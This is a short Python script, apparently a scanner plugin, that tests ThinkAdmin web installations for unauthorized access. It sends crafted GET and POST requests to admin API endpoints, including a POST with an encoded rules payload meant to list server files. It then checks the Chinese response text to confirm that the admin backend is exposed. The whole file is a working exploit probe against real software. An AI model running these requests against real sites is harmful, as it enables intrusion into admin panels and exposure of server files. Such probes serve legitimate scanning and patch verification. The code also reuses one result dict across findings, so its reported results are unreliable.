# coding=utf-8
import random
import requests


def check(url):
    results = []
    items = {
        "Url": url, 
        "Vuln": 'thinkadmin_unauthorized_access', 
        "Type": None, 
        "Payload": None
    }
    payload1 = "?s=admin/api.Update/tree"
    payload2 = "?s=admin/api.Update/node"
    payload3 = "?s=admin/"

    try:
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        r = requests.get(url + payload1, headers=headers)
        if "成功" in r.text:
            print("成功")
            items['Type'] = 'GET'
            items['Payload'] = payload1
            results.append(items)

        r = requests.post(url + payload2, data="rules=%5b%22%2e%5c%2f%22%5d", headers=headers)
        if "成功" in r.text:
            print("成功")
            items['Type'] = 'POST'
            items['Payload'] = payload2 + 'data: rules=%5b%22%2e%5c%2f%22%5d'
            results.append(items)

        r = requests.get(url + payload3, headers=headers)
        if ("后台首页" in r.text or "文件管理" in r.text or "系统管理" in r.text or "内容管理" in r.text or "系统设置" in r.text):
            print("成功")
            items['Type'] = 'GET'
            items['Payload'] = payload3
            results.append(items)

        return results

    except Exception as e:
        return e
